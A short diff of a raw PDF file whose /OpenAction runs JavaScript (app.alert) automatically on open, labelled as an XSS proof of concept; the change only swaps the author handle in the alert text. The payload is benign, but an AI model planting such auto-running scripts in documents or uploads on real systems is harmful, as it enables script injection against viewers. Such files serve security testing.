@@ -3,7 +3,7 @@
 << /Type /Catalog /Pages 3 0 R /OpenAction 2 0 R >>
 endobj
 2 0 obj
-<< /S /JavaScript /JS (app.alert("XSS by h6nt3r")) >>
+<< /S /JavaScript /JS (app.alert("XSS by suslu")) >>
 endobj
 3 0 obj
 << /Type /Pages /Kids [4 0 R] /Count 1 >>
